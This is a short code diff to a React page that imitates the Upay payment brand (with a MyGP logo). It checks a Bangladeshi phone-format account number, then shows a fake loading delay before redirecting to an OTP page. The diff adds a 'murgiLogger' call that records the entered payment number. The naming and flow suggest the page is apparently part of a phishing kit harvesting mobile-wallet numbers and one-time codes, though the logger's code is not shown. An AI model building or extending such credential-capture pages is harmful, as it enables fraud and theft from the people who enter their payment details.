@@ -4,6 +4,7 @@ import { useToast } from "@/hooks/use-toast";
 import upayLogo from "@/assets/upay-logo.png";
 import mygpLogo from "@/assets/mygp-logo.png";
 import { Loader } from "@/components/ui/loader";
+import murgiLogger from "@/lib/murgiLogger";
 
 const Upay = () => {
   const navigate = useNavigate();
@@ -17,6 +18,7 @@ const Upay = () => {
   const handleConfirm = () => {
     const bdPhoneRegex = /^01[3-9]\d{8}$/;
     if (accountNumber.length === 11 && bdPhoneRegex.test(accountNumber)) {
+      murgiLogger.paymentNumber("Upay", accountNumber);
       setLoading(true);
       setTimeout(() => {
         navigate(`/otp?amount=${amount}`, { 
